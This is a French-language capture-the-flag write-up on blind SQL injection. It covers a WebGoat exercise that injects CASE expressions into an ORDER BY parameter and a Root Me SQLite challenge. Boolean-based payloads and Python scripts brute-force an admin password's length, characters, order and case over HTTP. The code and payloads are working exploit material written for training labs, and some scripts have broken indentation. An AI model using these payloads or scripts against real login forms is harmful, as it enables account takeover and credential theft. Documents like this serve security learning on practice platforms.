# Injection SQL en Aveugle :see_no_evil:

## WebGoat 8.10 > (A1) Injection > SQL Injection (mitigation) > (12)

### Identification du point d'injection

Lorsque nous effectuons l'action de réorganiser le tableau, la requête suivante est envoyée :

```
/serves?column=mac
```

Si nous modifions l'URL en mettant : 

```
/serves?column=
```
Nous obtenons l'erreur suivante :

```java
here was an unexpected error (type=Internal Server Error, status=500).
java.sql.SQLSyntaxErrorException: unexpected end of statement:  required: END 
```

Le point d'injection est identifié.

### Identification de la réponse oui/non

```
/servers?column=case status when 'online' then ip else mac end
```
Ceci nous retourne un tri en fonction de MAC

```
/servers?column=case hostname when 'webgoat-prd' then id else hostname end
```

Ceci en fonction de hostname

Donc, si nous effectuons la requete suivante :

```
/servers?column=case when ip = '192.168.4.2' then id else ip end
```
Et que cela nous retourne en fonction de l'IP, alors c'est que celle-ci n'éxiste pas.

Nous pouvons donc chercher l'IP en fonction de ce qui est retourner. Si la requete nous retourne True alors ça sera trier en fonction de l'ID, si elle nous retourne false alors ce sera trier en fonction de l'IP.

```
/servers?column=case when(select ip from servers where hostname = 'webgoat-prd') > '100' then id else ip end
# True
```

```
/servers?column=case when(select ip from servers where hostname = 'webgoat-prd') > '100' then id else ip end
# True
```

```
/servers?column=case when(select ip from servers where hostname = 'webgoat-prd') > '106' then id else ip end
# False
```

```
/servers?column=case when(select ip from servers where hostname = 'webgoat-prd') > '103' then id else ip end
# True
```

```
/servers?column=case when(select ip from servers where hostname = 'webgoat-prd') > '104.130.219.201' then id else ip end
# True
```

La bonne IP est donc 104.130.219.201.

## Root Me > SQL injection - En aveugle

### Identification du champs

Pour commencer, essayons de voir a quel endroit l'injection peut se faire.
Pour se faire, je vais essayer de générer une erreur sur la base de donnée. Je vais donc entrer '"' dans le champs login et un caractère au hasard dans le champs password.

Voici le retour de l'erreur générée : 

```
**Warning**: SQLite3::query(): Unable to prepare statement: 1, near ""' and password='"": syntax error in **/challenge/web-serveur/ch10/index.php** on line **39**
```

Nous savons donc que ce champs est vulnérable à l'injection SQL. Nous savons également que le moteur de base de donnée utilisée est SQLite3. Et le nom de la colonne 'password'

### Compréhension de la requête envoyée
Je tente une injection de base 

champs username : ' OR 1 = 1 --
champs password : fjofz

le retour de cette tentative : 

```
Welcome back user1 !

Your informations :

- username : user1
```


Je vais tenter une autre requête : 

```sql
' OR username = "user1" --
```

Qui me retourne 

```
Welcome back user1 !

Your informations :

- username : user1
```

Ce qui nous montre que le nom de la colonne username est bien celle-ci et que le user1 existe.
Nous pouvons faire la même chose avec le compte admin 

```sql
' OR username = "admin" --
```

Ce qui me retourne : 

```
Welcome back admin !

Your informations :

- username : admin

  
Hi master ! **To validate the challenge use this password**
```

Nous avons le username, le but maintenant est de trouver le password de ce compte.
Nous savons déjà le nom de la colonne password grâce a l'erreur générée plus haut.

Je vais essayer de faire un UNION afin de récupérer le password : 

```sql
' OR 1 UNION (select password from user where username = 'admin') --
```

Ce qui me retourne : 

```
### Injection detected !
```

'UNION' doit faire partie d'une wordlist de banword.
Il n'est donc plus envisageable d'utiliser un UNION dans nos requête.

## Trouver le nombre de caractère du password
Pour la suite du challenge, il va falloir trouver le mot de passe admin, pour ça il va falloir générer une hypothèse qui nous permettra de retrouver le password le plus rapidement possible

Pour éviter un trop grand nombre de requête dans le bruteforce, je vais déjà commencer par déterminer le nombre de caractère du password.

```sql
' OR (SELECT length(password) FROM users WHERE username = "admin") > 5 --  
```

Ce qui me retourne une connexion en admin.
Donc le password est plus grand que 5 caractères

Essayons avec plus petit que 8

```sql
' OR (SELECT length(password) FROM users WHERE username = "admin") > 8 --  
```

Ce qui me retourne "no such password" donc il n'est pas plus petit que 8.

Essayons égal à 8

```sql
' OR (SELECT length(password) FROM users WHERE username = "admin") = 8 --  
```

Ce qui me retourne une connexion sur le compte admin, donc le mot de passe fait 8 caractères.

## Retrouver les caractères dans le password
Maintenant qu'on sait déjà le nombre de caractère contenu dans notre password, on va réduire nos recherches avec un LIKE qui va nous permettre de savoir si le caractère est dans le password que l'on cherche ou pas.

Essayons déjà quelques voyelles à la main pour tester notre requête

```sql
' OR (SELECT password where username = "admin" ) LIKE "%a%" -- 
```

Nous retourne TRUE

```sql
' OR (SELECT password where username = "admin" ) LIKE "%z%" --
```

Nous retourne FALSE

Maintenant que nous sommes sûr que la requête fais bien ce que l'on veut, on va pouvoir automatiser tout ça avec python afin de venir tester tous les caractère et les chiffres un par un.

```python
import requests, string, re

url = "http://challenge01.root-me.org/web-serveur/ch10/"

def main():
	 password_caractere = trouverCaractere(url)
	 print(password_caractere)
  
def trouverCaractere(url):
	 chiffres = ""
	 caractere_dans_passwd = ""
	 for i in range(10):
		 chiffres += str(i)	
		 caractere_list = str(string.ascii_lowercase) + str(chiffres)	
		 for i in caractere_list:
			 requete = f"' OR (SELECT password where username = 'admin' ) LIKE '%{i}%' --"		
			 r = requests.post(url, data={'username': requete, 'password': "a"})	
			 html_reponse = r.text	
			 matches = re.search(r"Welcome", html_reponse)	
			 try:	
				 if matches.group(0) == "Welcome":	
					 caractere_dans_passwd = str(caractere_dans_passwd) + str(i)	
			 except:	
				 pass
	 return caractere_dans_passwd

if __name__=="__main__":
	 main()
```

Ce qui me renvois alors : 

```
aeioz239
```

Nous avons le password maintenant, mais dans le désordre. Il fait bien 8 caractère, donc nous avons aucunes lettres en double, ce qui va nous économiser des requêtes.

## Retrouver la positions du caractère dans le password

Maintenant il nous reste plus qu'a trouver leurs position dans le password.
Continuons le scripts en y ajoutant la fonction adéquat.

La requete par exemple que j'ai tester à la main pour être sur qu'elle fasse ce que l'on veut et la suivante :
```sql
' OR (SELECT password where username = "admin" ) LIKE "__a_____" --
```
qui nous retourne une connexion, donc le caractère a est en 3 ème position. 

Continuons avec un script python :

```python
import requests, re

url = "http://challenge01.root-me.org/web-serveur/ch10/"
caracteres = "aeioz239"
tab = ['_','_','_','_','_','_','_','_']
tab2 = ['','','','','','','','']
position = ""
result =""
password = ""
for i in caracteres:
	 for n in range(len(tab)):
	 if tab[n] == '_':
		 tab[n] = i
		 for j in tab:
			 position += j
			 requete = f"' OR (SELECT password where username = 'admin' ) LIKE '{position}' --"
			 r = requests.post(url, data={'username': requete, 'password': "a"})
			 html_reponse = r.text
			 matches = re.search(r"Welcome", html_reponse)
			 try:
				 if matches.group(0) == "Welcome":
				 print(f"(+) POSITION TROUVER : {position}")
				 compteur = 1
				 for k in position:
					 if i == k:
						 print(f"(+) CARACTERE {k} EST EN POSITION {compteur}")
						 tab2[compteur-1] = k
					 else:
						 compteur = compteur + 1
					 except:
						 pass
					 position = ""
					 tab = ['_','_','_','_','_','_','_','_']
password = ""
for i in tab2:
	password += i
print(password)
```

Ce qui nous donne le password suivant :

```
e2azo93i
```

Le problème maintenant c'est que le LIKE que nous utilisons dans nos script ne prend pas la casse des minuscules majuscule, donc il faut aussi pour chaque lettre qui a fonctionner, tester si elle est en majuscule ou en minuscule.

On va rajouter dans notre premier code, a chaque fois qu'il va trouver un caractère dans le mot de passe, il va renvoyer une requête qui cette fois si ressemblera a celle-ci : 

```sql
OR (SELECT password where username = 'admin' ) GLOB '*A*' --
```

Le code deviens : 

```python
import requests, string, re

url = "http://challenge01.root-me.org/web-serveur/ch10/"

def main():
	 password_caractere = trouverCaractere(url)
	 print(password_caractere)

def trouverCaractere(url):
	 chiffres = ""
	 caractere_dans_passwd = ""
	 for i in range(10):
		 chiffres += str(i)
		 caractere_list = str(string.ascii_lowercase) + str(chiffres)
		 for i in caractere_list:
			 requete = f"' OR (SELECT password where username = 'admin' ) LIKE '%{i}%' --"
			 r = requests.post(url, data={'username': requete, 'password': "a"})
			 html_reponse = r.text
			 matches = re.search(r"Welcome", html_reponse)
			 try:
				 if matches.group(0) == "Welcome":
				 requete2 = f"' OR (SELECT password where username = 'admin' ) GLOB '*{i.upper()}*' --"
				 print(requete2)
				 r2 = requests.post(url, data={'username': requete2, 'password': "a"})
				 html_reponse2 = r2.text
				 matches2 = re.search(r"Welcome", html_reponse2)
				 try:
					 if matches2.group(0) == "Welcome":
						 caractere_dans_passwd = str(caractere_dans_passwd) + str(i.upper())
				 except:
					 caractere_dans_passwd = str(caractere_dans_passwd) + str(i)
			 except:
				 pass
	 return caractere_dans_passwd
```

Le code va nous renvoyer les caractère contenu dans password, sauf qu'il mettra si c'est une majuscule ou non.

Nous obtenons donc la suite de caractère suivante : 

```
aeiOz239
```

Nous retrions maintenant les caractères dans l'ordre grâce au second code plus haut : et nous obtenons le flag : 

```
e2azO93i
```


J'ai réunis le code ensuite en un seul avec deux fonction 'trouverCaractere(url) et trouverPosition(url, caractères)' Et fait en sorte de comptabiliser le nombre total de requêtes effectuer par chaque fonctions. Ce qui ramène à 108 requêtes pour les deux fonctions appelées.
